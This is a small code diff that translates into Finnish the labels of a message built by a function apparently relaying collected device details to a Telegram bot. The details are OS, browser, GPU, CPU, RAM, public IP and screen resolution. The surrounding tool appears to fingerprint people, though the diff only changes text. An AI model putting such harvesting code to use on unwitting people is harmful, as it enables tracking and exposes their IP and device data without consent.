@@ -26,18 +26,18 @@ def tgram_sender(msg_type, content, token):
     json_content = loads(json_str)
     if msg_type == 'device_info':
         info_message = f"""
-*Device Information*
+*Laitteen Tiedot*
 
 ```
 OS         : {json_content['os']}
-Platform   : {json_content['platform']}
-Browser    : {json_content['browser']}
-GPU Vendor : {json_content['vendor']}
+Alusta   : {json_content['platform']}
+Selain    : {json_content['browser']}
+GPU valmistaja : {json_content['vendor']}
 GPU        : {json_content['render']}
-CPU Cores  : {json_content['cores']}
+CPU ytimet  : {json_content['cores']}
 RAM        : {json_content['ram']}
-Public IP  : {json_content['ip']}
-Resolution : {json_content['ht']}x{json_content['wd']}
+Julkinen IP  : {json_content['ip']}
+Resoluutio : {json_content['ht']}x{json_content['wd']}
 ```"""
         send_request(token, info_message)
 
